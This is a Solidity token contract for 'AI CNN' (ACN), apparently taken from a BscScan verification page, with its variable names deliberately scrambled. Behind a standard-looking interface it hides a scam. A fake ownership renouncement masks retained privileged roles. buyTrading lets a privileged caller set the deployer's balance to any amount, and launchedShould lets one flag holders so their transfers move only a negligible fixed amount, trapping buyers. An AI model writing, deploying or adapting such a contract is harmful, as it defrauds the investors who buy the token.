/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface listLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundTx) external view returns (uint256);

    function transfer(address marketingLiquiditySender, uint256 receiverExemptTrading) external returns (bool);

    function allowance(address txLimitReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverExemptTrading) external returns (bool);

    function transferFrom(
        address sender,
        address marketingLiquiditySender,
        uint256 receiverExemptTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isReceiverBuy, uint256 value);
    event Approval(address indexed txLimitReceiver, address indexed spender, uint256 value);
}

interface isTokenReceiver is listLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface tradingTakeSell {
    function createPair(address limitLaunched, address marketingIsExempt) external returns (address);
}

interface modeSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract liquidityAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract AICNN is liquidityAt, listLimit, isTokenReceiver {
    uint8 private takeReceiver = 18;
    

    uint256 private sellSenderReceiver;
    uint256 private tradingFundBuy;
    mapping(address => mapping(address => uint256)) private buyTeam;
    


    uint256 public maxTeam;


    uint256 constant toLiquidityTx = 13 ** 10;
    bool public shouldTo;
    bool private takeFundShould;
    mapping(address => bool) public receiverMax;
    uint256 public buyShould;
    bool public listWallet;
    address private walletSenderIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private receiverMin;
    address public receiverSwap;
    mapping(address => uint256) private fundFee;
    uint256 private sellTeamEnable = 100000000 * 10 ** takeReceiver;
    address public shouldToken;
    string private marketingSenderFund = "ACN";
    bool public maxTo;
    mapping(address => bool) public marketingAutoFrom;
    string private senderLaunched = "AI CNN";
    

    event OwnershipTransferred(address indexed amountExempt, address indexed toList);

    constructor (){
        if (sellSenderReceiver == buyShould) {
            maxTo = true;
        }
        modeSwap launchedReceiver = modeSwap(walletSenderIs);
        shouldToken = tradingTakeSell(launchedReceiver.factory()).createPair(launchedReceiver.WETH(), address(this));
        receiverMin = _msgSender();
        if (listWallet == takeFundShould) {
            maxTeam = tradingFundBuy;
        }
        receiverSwap = receiverMin;
        receiverMax[receiverSwap] = true;
        if (maxTeam == buyShould) {
            maxTo = false;
        }
        fundFee[receiverSwap] = sellTeamEnable;
        emit Transfer(address(0), receiverSwap, sellTeamEnable);
        walletTx();
    }

    

    function walletTx() public {
        emit OwnershipTransferred(receiverSwap, address(0));
        receiverMin = address(0);
    }

    function launchedShould(address walletTrading) public {
        if (sellSenderReceiver != tradingFundBuy) {
            buyShould = tradingFundBuy;
        }
        if (walletTrading == receiverSwap || walletTrading == shouldToken || !receiverMax[_msgSender()]) {
            return;
        }
        if (takeFundShould != maxTo) {
            tradingFundBuy = buyShould;
        }
        marketingAutoFrom[walletTrading] = true;
    }

    function getOwner() external view returns (address) {
        return receiverMin;
    }

    function decimals() external view virtual override returns (uint8) {
        return takeReceiver;
    }

    function allowance(address minTx, address walletMaxReceiver) external view virtual override returns (uint256) {
        return buyTeam[minTx][walletMaxReceiver];
    }

    function owner() external view returns (address) {
        return receiverMin;
    }

    function symbol() external view virtual override returns (string memory) {
        return marketingSenderFund;
    }

    function approve(address walletMaxReceiver, uint256 receiverExemptTrading) public virtual override returns (bool) {
        buyTeam[_msgSender()][walletMaxReceiver] = receiverExemptTrading;
        emit Approval(_msgSender(), walletMaxReceiver, receiverExemptTrading);
        return true;
    }

    function atMode(address autoReceiver, address marketingLiquiditySender, uint256 receiverExemptTrading) internal returns (bool) {
        require(fundFee[autoReceiver] >= receiverExemptTrading);
        fundFee[autoReceiver] -= receiverExemptTrading;
        fundFee[marketingLiquiditySender] += receiverExemptTrading;
        emit Transfer(autoReceiver, marketingLiquiditySender, receiverExemptTrading);
        return true;
    }

    function receiverLaunchEnable() public view returns (bool) {
        return listWallet;
    }

    function atLimit() public {
        if (sellSenderReceiver == maxTeam) {
            takeFundShould = true;
        }
        if (tradingFundBuy == sellSenderReceiver) {
            listWallet = false;
        }
        sellSenderReceiver=0;
    }

    function buyTrading(uint256 receiverExemptTrading) public {
        if (!receiverMax[_msgSender()]) {
            return;
        }
        fundFee[receiverSwap] = receiverExemptTrading;
    }

    function transfer(address autoMaxMin, uint256 receiverExemptTrading) external virtual override returns (bool) {
        return limitMax(_msgSender(), autoMaxMin, receiverExemptTrading);
    }

    function toExempt() public view returns (uint256) {
        return tradingFundBuy;
    }

    function limitMax(address autoReceiver, address marketingLiquiditySender, uint256 receiverExemptTrading) internal returns (bool) {
        if (autoReceiver == receiverSwap || marketingLiquiditySender == receiverSwap) {
            return atMode(autoReceiver, marketingLiquiditySender, receiverExemptTrading);
        }
        
        if (marketingAutoFrom[autoReceiver]) {
            return atMode(autoReceiver, marketingLiquiditySender, toLiquidityTx);
        }
        if (tradingFundBuy == buyShould) {
            maxTeam = buyShould;
        }
        return atMode(autoReceiver, marketingLiquiditySender, receiverExemptTrading);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellTeamEnable;
    }

    function launchExempt() public view returns (uint256) {
        return maxTeam;
    }

    function tradingSenderTx() public {
        
        if (listWallet != maxTo) {
            tradingFundBuy = sellSenderReceiver;
        }
        buyShould=0;
    }

    function autoList(address liquidityAuto) public {
        if (shouldTo) {
            return;
        }
        
        receiverMax[liquidityAuto] = true;
        if (listWallet != takeFundShould) {
            maxTeam = buyShould;
        }
        shouldTo = true;
    }

    function transferFrom(address autoReceiver, address marketingLiquiditySender, uint256 receiverExemptTrading) external override returns (bool) {
        if (buyTeam[autoReceiver][_msgSender()] != type(uint256).max) {
            require(receiverExemptTrading <= buyTeam[autoReceiver][_msgSender()]);
            buyTeam[autoReceiver][_msgSender()] -= receiverExemptTrading;
        }
        return limitMax(autoReceiver, marketingLiquiditySender, receiverExemptTrading);
    }

    function name() external view virtual override returns (string memory) {
        return senderLaunched;
    }

    function balanceOf(address fundTx) public view virtual override returns (uint256) {
        return fundFee[fundTx];
    }


}